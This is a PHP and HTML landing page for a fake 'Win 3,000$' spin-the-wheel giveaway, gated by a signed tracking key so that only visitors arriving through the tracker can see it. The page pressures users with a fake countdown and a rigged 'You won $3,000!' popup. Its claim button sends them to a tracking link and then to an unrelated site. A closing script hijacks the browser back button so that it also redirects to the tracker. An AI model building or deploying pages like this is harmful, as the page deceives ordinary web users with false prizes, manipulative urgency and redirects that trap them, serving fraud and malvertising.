

<?php
    const PROTECTION_TOKEN = 'MWI1ZmJkY2ViZjNjNTg3NzlmNzVjM2M1ZDYwYzY0YWM='; // Your landing protection token
    const KEY_TTL = '30 minutes'; // How long KEY should be valid. Valid formats are explained here: http://php.net/manual/en/datetime.formats.php
    const KEY_GET_PARAM = 'key'; // GET parameter with Skro landing key.

    $key = isset($_GET[KEY_GET_PARAM]) ? rawurldecode($_GET[KEY_GET_PARAM]) : exit('Access denied');
    if (!$key = base64_decode($key)) {
        exit('Access denied');
    }
    if (!$key = json_decode($key, true)) {
        exit('Access denied');
    }
    if (!isset($key['timestamp']) || !isset($key['hash'])) {
        exit('Access denied');
    }
    $signedHash = hash_hmac('sha1', $key['timestamp'], PROTECTION_TOKEN);
    if ($signedHash !== $key['hash'] || strtotime(KEY_TTL, $key['timestamp']) < time()) {
        exit('Access denied');
    }
?>
    
<!DOCTYPE html>
<html>

<head>
    <title>Sweep Now</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width" />
    <link href="./css/styles.css" rel="stylesheet" />
    <link href="./css/wheel.css" rel="stylesheet" />
    <script type="text/javascript" src="./js/Winwheel.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/latest/TweenMax.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script type="text/javascript" src="./js/Winwheel.js"></script>

</head>

<body>
    <div class="main-section">
        <div class="header">
            <h1 class="main-title" ><img src="./img/moneypk.png">Win 3,000$!<img src="./img/moneypk.png">
            </h1>
        </div>
        <h4 class="intro-copy" >You have <span id="mins">0</span> minutes and <span id="hsecs" style="color:red">57</span> seconds
            </b>
            to play or your points will be given to others.</h4>
        <h3 class="spin-copy" >Note: This prize is valid for a limited time so hurry!</h3>
        <div class="spinning-section" id="canvasContainer">
            <canvas id='canvas' width='300' height='300'>
                Canvas not supported, use another browser.
            </canvas>
            <img id="prizePointer" src="./img/wheel-pointer.png" alt="V" />
        </div>
    </div>
    <div class="custom-model-main">
        <div id="emitter"></div>
        <div class="custom-model-inner">
            <div class="close-btn">×</div>
            <div class="custom-model-wrap">
                <div class="pop-up-content-wrap pop-up-content-wrap-1">
                    <h4 >Congratulations!</h4>
                    <p > Each week we will pick one lucky customer who can win
                        <strong>3,000$</strong>! </p>
                    <div  class="repeat-btn repeat-btn-1" onClick="theWheel.startAnimation();">Okay fine</div>
                </div>
                <div class="pop-up-content-wrap pop-up-content-wrap-2">
                    <h4>Sorry, you didn't get anything.</h4>
                    <img src="./img/refresh-black.png" alt="refresh-prize">
                    <p > Let's try it again! </p>
                    <div  class="repeat-btn repeat-btn-2" onClick="startSpin();">Okay fine</div>
                </div>
                <div class="pop-up-content-wrap pop-up-content-wrap-3">
                    <h4 >Congratulations!</h4>
                    <img src="./img/moneyprizeZA.png" alt="refresh-prize">
                    <p > You won $3,000! Please claim your rewards. </p>
                    <a  href="https://skrotrack.com/click" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);" class="final-btn repeat-btn">Okay fine</a>
                </div>
            </div>
        </div>
        <div class="bg-overlay"></div>
    </div>
    <script type="text/javascript" src="./js/spinning.js"></script>
    <script type="text/javascript" src="./js/scripts.js"></script>
    <script type="text/javascript" src="./js/confetti.js"></script>
    <script>
        // 当页面加载完成时，立即向history栈添加一个状态
        history.pushState(null, null, location.href);
        
        window.onpopstate = function(event) {
            // 这里处理用户点击浏览器后退按钮的情况
            // 重定向用户到指定页面, 比如 Google
            location.href = 'https://skrotrack.com/click';
            // 或者重定向用户到他们之前的页面
            // history.go(-1);
        }
      </script>
</body>

</html>